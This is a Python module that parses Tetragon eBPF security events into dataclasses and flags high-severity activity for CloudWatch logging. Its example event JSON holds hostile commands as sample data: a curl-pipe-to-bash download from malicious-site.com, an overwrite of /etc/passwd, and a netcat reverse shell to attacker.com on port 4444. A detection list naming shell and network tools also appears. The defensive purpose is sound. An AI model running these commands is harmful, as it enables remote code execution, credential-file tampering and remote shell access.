# Tetragon Event Schema and JSON Structure Definitions
# Comprehensive mapping of Tetragon eBPF events for parsing and filtering

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any
from enum import Enum
from datetime import datetime
import json

class EventType(Enum):
    """Tetragon event types with their corresponding numeric values"""
    PROCESS_EXEC = 1
    PROCESS_EXIT = 5
    PROCESS_KPROBE = 9
    PROCESS_TRACEPOINT = 10
    FILE = 3
    NETWORK = 4
    LOADER = 6
    CAPABILITIES = 7
    USER = 8

class ActionType(Enum):
    """Action types for TracingPolicy enforcement"""
    POST = "post"
    SIGKILL = "sigkill"
    DENY = "deny"
    OVERRIDE = "override"

@dataclass
class ProcessInfo:
    """Process information embedded in Tetragon events"""
    exec_id: str
    pid: int
    uid: int
    cwd: str
    binary: str
    arguments: str
    flags: str
    start_time: datetime
    auid: int
    pod: Optional[Dict[str, Any]] = None
    docker: Optional[Dict[str, str]] = None
    parent_exec_id: Optional[str] = None
    tid: int = 0

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ProcessInfo':
        """Parse process info from Tetragon JSON"""
        return cls(
            exec_id=data.get('exec_id', ''),
            pid=data.get('pid', 0),
            uid=data.get('uid', 0),
            cwd=data.get('cwd', ''),
            binary=data.get('binary', ''),
            arguments=data.get('arguments', ''),
            flags=data.get('flags', ''),
            start_time=datetime.fromisoformat(data.get('start_time', '').replace('Z', '+00:00')),
            auid=data.get('auid', 0),
            pod=data.get('pod'),
            docker=data.get('docker'),
            parent_exec_id=data.get('parent_exec_id'),
            tid=data.get('tid', 0)
        )

@dataclass
class FileInfo:
    """File access information from Tetragon events"""
    path: str
    flags: List[str] = field(default_factory=list)
    permission: str = ""
    mode: int = 0
    size: int = 0
    uid: int = 0
    gid: int = 0

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'FileInfo':
        """Parse file info from Tetragon JSON"""
        return cls(
            path=data.get('path', ''),
            flags=data.get('flags', []),
            permission=data.get('permission', ''),
            mode=data.get('mode', 0),
            size=data.get('size', 0),
            uid=data.get('uid', 0),
            gid=data.get('gid', 0)
        )

@dataclass
class NetworkInfo:
    """Network connection information from Tetragon events"""
    protocol: str
    family: str
    src_ip: str
    src_port: int
    dst_ip: str
    dst_port: int
    state: str = ""
    direction: str = ""

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'NetworkInfo':
        """Parse network info from Tetragon JSON"""
        return cls(
            protocol=data.get('protocol', ''),
            family=data.get('family', ''),
            src_ip=data.get('src_ip', ''),
            src_port=data.get('src_port', 0),
            dst_ip=data.get('dst_ip', ''),
            dst_port=data.get('dst_port', 0),
            state=data.get('state', ''),
            direction=data.get('direction', '')
        )

@dataclass
class KProbeInfo:
    """Kernel probe event information"""
    function_name: str
    args: Dict[str, Any] = field(default_factory=dict)
    return_value: Optional[Any] = None
    return_action: Optional[str] = None

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'KProbeInfo':
        """Parse kprobe info from Tetragon JSON"""
        return cls(
            function_name=data.get('function_name', ''),
            args=data.get('args', {}),
            return_value=data.get('return'),
            return_action=data.get('action')
        )

@dataclass
class KubernetesInfo:
    """Kubernetes metadata from Tetragon events"""
    namespace: str
    pod_name: str
    container_name: str
    pod_labels: Dict[str, str] = field(default_factory=dict)
    workload_kind: str = ""
    workload_name: str = ""

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'KubernetesInfo':
        """Parse Kubernetes info from Tetragon JSON"""
        return cls(
            namespace=data.get('namespace', ''),
            pod_name=data.get('pod_name', ''),
            container_name=data.get('container_name', ''),
            pod_labels=data.get('pod_labels', {}),
            workload_kind=data.get('workload_kind', ''),
            workload_name=data.get('workload_name', '')
        )

@dataclass
class NodeInfo:
    """Node information for regional context"""
    node_name: str
    cluster_name: str
    region: str = ""
    availability_zone: str = ""
    instance_type: str = ""
    vpc_id: str = ""
    subnet_id: str = ""
    private_ip: str = ""

    def is_kisumu_region(self, kisumu_cidrs: List[str]) -> bool:
        """Check if node is in Lake Victoria/Kisumu regional VPC"""
        if not self.private_ip:
            return False

        import ipaddress
        node_ip = ipaddress.ip_address(self.private_ip)

        for cidr in kisumu_cidrs:
            if node_ip in ipaddress.ip_network(cidr):
                return True
        return False

@dataclass
class TetragonEvent:
    """Main Tetragon event structure"""
    process_exec_id: str
    node_name: str
    time: datetime
    event_type: EventType
    process: ProcessInfo
    parent: Optional[ProcessInfo] = None
    file: Optional[FileInfo] = None
    network: Optional[NetworkInfo] = None
    kprobe: Optional[KProbeInfo] = None
    kubernetes: Optional[KubernetesInfo] = None
    node_info: Optional[NodeInfo] = None
    policy_name: str = ""
    severity: str = "medium"
    action: Optional[ActionType] = None

    @classmethod
    def from_json(cls, json_str: str) -> 'TetragonEvent':
        """Parse TetragonEvent from JSON string"""
        try:
            data = json.loads(json_str)
            return cls.from_dict(data)
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON: {e}")

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'TetragonEvent':
        """Parse TetragonEvent from dictionary"""
        # Parse event type
        event_type_str = data.get('event_type', '').upper()
        if 'PROCESS_EXEC' in event_type_str:
            event_type = EventType.PROCESS_EXEC
        elif 'PROCESS_EXIT' in event_type_str:
            event_type = EventType.PROCESS_EXIT
        elif 'PROCESS_KPROBE' in event_type_str:
            event_type = EventType.PROCESS_KPROBE
        elif 'PROCESS_TRACEPOINT' in event_type_str:
            event_type = EventType.PROCESS_TRACEPOINT
        elif 'FILE' in event_type_str:
            event_type = EventType.FILE
        elif 'NETWORK' in event_type_str:
            event_type = EventType.NETWORK
        else:
            event_type = EventType.PROCESS_EXEC  # Default

        # Parse process info (required)
        process = ProcessInfo.from_dict(data.get('process', {}))

        # Parse optional parent process
        parent = None
        if 'parent' in data and data['parent']:
            parent = ProcessInfo.from_dict(data['parent'])

        # Parse file info if present
        file_info = None
        if 'file' in data and data['file']:
            file_info = FileInfo.from_dict(data['file'])

        # Parse network info if present
        network_info = None
        if 'network' in data and data['network']:
            network_info = NetworkInfo.from_dict(data['network'])

        # Parse kprobe info if present
        kprobe_info = None
        if 'kprobe' in data and data['kprobe']:
            kprobe_info = KProbeInfo.from_dict(data['kprobe'])

        # Parse Kubernetes info if present
        k8s_info = None
        if 'kubernetes' in data and data['kubernetes']:
            k8s_info = KubernetesInfo.from_dict(data['kubernetes'])

        # Parse node info
        node_info = None
        if 'node_name' in data:
            node_info = NodeInfo(
                node_name=data.get('node_name', ''),
                cluster_name=data.get('cluster_name', ''),
                region=data.get('region', ''),
                availability_zone=data.get('availability_zone', ''),
                instance_type=data.get('instance_type', ''),
                vpc_id=data.get('vpc_id', ''),
                subnet_id=data.get('subnet_id', ''),
                private_ip=data.get('private_ip', '')
            )

        # Parse action if present
        action = None
        action_str = data.get('action', '')
        if action_str:
            try:
                action = ActionType(action_str.lower())
            except ValueError:
                action = None

        return cls(
            process_exec_id=data.get('process_exec_id', ''),
            node_name=data.get('node_name', ''),
            time=datetime.fromisoformat(data.get('time', '').replace('Z', '+00:00')),
            event_type=event_type,
            process=process,
            parent=parent,
            file=file_info,
            network=network_info,
            kprobe=kprobe_info,
            kubernetes=k8s_info,
            node_info=node_info,
            policy_name=data.get('policy_name', ''),
            severity=data.get('severity', 'medium'),
            action=action
        )

    def is_high_severity(self) -> bool:
        """Check if event is high severity based on multiple criteria"""
        high_severity_conditions = [
            # Action-based severity
            self.action in [ActionType.SIGKILL, ActionType.DENY],

            # Process-based severity
            self.event_type == EventType.PROCESS_EXEC and any([
                'bash' in self.process.binary.lower(),
                'sh' in self.process.binary.lower(),
                'curl' in self.process.binary.lower(),
                'wget' in self.process.binary.lower(),
                'netcat' in self.process.binary.lower(),
                'nmap' in self.process.binary.lower(),
            ]),

            # File-based severity
            self.event_type == EventType.FILE and self.file and any([
                self.file.path.startswith('/etc/'),
                self.file.path.startswith('/bin/'),
                self.file.path.startswith('/sbin/'),
                '/passwd' in self.file.path,
                '/shadow' in self.file.path,
            ]),

            # Network-based severity
            self.event_type == EventType.NETWORK and self.network and (
                self.network.dst_port in [22, 23, 21, 4444, 5555, 31337]  # SSH, Telnet, FTP, common backdoors
            ),

            # Explicit severity marking
            self.severity.lower() in ['high', 'critical'],
        ]

        return any(high_severity_conditions)

    def is_process_exec_event(self) -> bool:
        """Check if this is a process execution event"""
        return self.event_type in [EventType.PROCESS_EXEC, EventType.PROCESS_KPROBE, EventType.PROCESS_TRACEPOINT]

    def is_file_access_event(self) -> bool:
        """Check if this is a file access event"""
        return self.event_type == EventType.FILE and self.file is not None

    def is_network_event(self) -> bool:
        """Check if this is a network event"""
        return self.event_type == EventType.NETWORK and self.network is not None

    def to_cloudwatch_message(self) -> Dict[str, Any]:
        """Convert event to CloudWatch log message format"""
        message = {
            'timestamp': self.time.isoformat(),
            'event_type': self.event_type.name,
            'node_name': self.node_name,
            'process_exec_id': self.process_exec_id,
            'severity': self.severity,
            'policy_name': self.policy_name,
            'process': {
                'binary': self.process.binary,
                'arguments': self.process.arguments,
                'pid': self.process.pid,
                'uid': self.process.uid,
                'cwd': self.process.cwd,
            }
        }

        if self.action:
            message['action'] = self.action.value

        if self.parent:
            message['parent_process'] = {
                'binary': self.parent.binary,
                'pid': self.parent.pid,
                'exec_id': self.parent.exec_id
            }

        if self.file:
            message['file'] = {
                'path': self.file.path,
                'flags': self.file.flags,
                'permission': self.file.permission
            }

        if self.network:
            message['network'] = {
                'protocol': self.network.protocol,
                'src_ip': self.network.src_ip,
                'src_port': self.network.src_port,
                'dst_ip': self.network.dst_ip,
                'dst_port': self.network.dst_port
            }

        if self.kubernetes:
            message['kubernetes'] = {
                'namespace': self.kubernetes.namespace,
                'pod_name': self.kubernetes.pod_name,
                'container_name': self.kubernetes.container_name,
                'workload_kind': self.kubernetes.workload_kind,
                'workload_name': self.kubernetes.workload_name
            }

        if self.node_info:
            message['node_info'] = {
                'vpc_id': self.node_info.vpc_id,
                'subnet_id': self.node_info.subnet_id,
                'private_ip': self.node_info.private_ip,
                'region': self.node_info.region,
                'availability_zone': self.node_info.availability_zone
            }

        return message

# Example Tetragon Event JSON Structures for Reference

EXAMPLE_PROCESS_EXEC_EVENT = '''
{
  "process_exec_id": "Y2lsaXVtLTEyMzQ1Njc4OQ==",
  "node_name": "eks-security-node-12345",
  "time": "2024-01-15T10:30:45.123456789Z",
  "event_type": "PROCESS_EXEC",
  "process": {
    "exec_id": "Y2lsaXVtLTEyMzQ1Njc4OQ==",
    "pid": 12345,
    "uid": 0,
    "cwd": "/tmp",
    "binary": "/usr/bin/curl",
    "arguments": "curl -s http://malicious-site.com/payload.sh | bash",
    "flags": "execve rootcwd",
    "start_time": "2024-01-15T10:30:45.123456789Z",
    "auid": 4294967295,
    "pod": {
      "namespace": "default",
      "name": "webapp-pod-xyz",
      "container": {
        "id": "containerd://abc123",
        "name": "webapp",
        "image": {
          "id": "sha256:def456",
          "name": "webapp:latest"
        },
        "start_time": "2024-01-15T09:00:00.000000000Z",
        "pid": 1
      },
      "pod_labels": {
        "app": "webapp",
        "version": "v1.0"
      }
    }
  },
  "parent": {
    "exec_id": "Y2lsaXVtLXBhcmVudA==",
    "pid": 1,
    "uid": 0,
    "binary": "/usr/local/bin/entrypoint",
    "arguments": "/usr/local/bin/entrypoint webapp",
    "start_time": "2024-01-15T09:00:00.000000000Z"
  },
  "kubernetes": {
    "namespace": "default",
    "pod_name": "webapp-pod-xyz",
    "container_name": "webapp",
    "pod_labels": {
      "app": "webapp",
      "version": "v1.0"
    },
    "workload_kind": "Deployment",
    "workload_name": "webapp-deployment"
  },
  "policy_name": "process-execution-enforcement",
  "severity": "critical",
  "action": "sigkill"
}
'''

EXAMPLE_FILE_ACCESS_EVENT = '''
{
  "process_exec_id": "Y2lsaXVtLWZpbGUxMjM0NQ==",
  "node_name": "eks-security-node-67890",
  "time": "2024-01-15T10:35:12.987654321Z",
  "event_type": "FILE",
  "process": {
    "exec_id": "Y2lsaXVtLWZpbGUxMjM0NQ==",
    "pid": 23456,
    "uid": 1000,
    "cwd": "/app",
    "binary": "/bin/bash",
    "arguments": "bash -c 'echo malicious > /etc/passwd'",
    "start_time": "2024-01-15T10:35:10.000000000Z"
  },
  "file": {
    "path": "/etc/passwd",
    "flags": ["O_WRONLY", "O_CREAT"],
    "permission": "write",
    "mode": 644,
    "uid": 0,
    "gid": 0
  },
  "kubernetes": {
    "namespace": "production",
    "pod_name": "api-server-abc",
    "container_name": "api"
  },
  "policy_name": "file-integrity-monitoring",
  "severity": "critical",
  "action": "deny"
}
'''

EXAMPLE_NETWORK_EVENT = '''
{
  "process_exec_id": "Y2lsaXVtLW5ldHdvcms=",
  "node_name": "eks-security-node-kisumu-001",
  "time": "2024-01-15T10:40:30.555666777Z",
  "event_type": "NETWORK",
  "process": {
    "exec_id": "Y2lsaXVtLW5ldHdvcms=",
    "pid": 34567,
    "uid": 1001,
    "binary": "/usr/bin/nc",
    "arguments": "nc -e /bin/bash attacker.com 4444"
  },
  "network": {
    "protocol": "TCP",
    "family": "AF_INET",
    "src_ip": "10.100.1.50",
    "src_port": 45678,
    "dst_ip": "192.168.1.100",
    "dst_port": 4444,
    "state": "SYN_SENT",
    "direction": "egress"
  },
  "node_info": {
    "vpc_id": "vpc-kisumu123",
    "subnet_id": "subnet-lakevictoria456",
    "private_ip": "10.100.1.50",
    "region": "af-south-1",
    "availability_zone": "af-south-1a"
  },
  "policy_name": "regional-vpc-enforcement",
  "severity": "critical",
  "action": "deny"
}
'''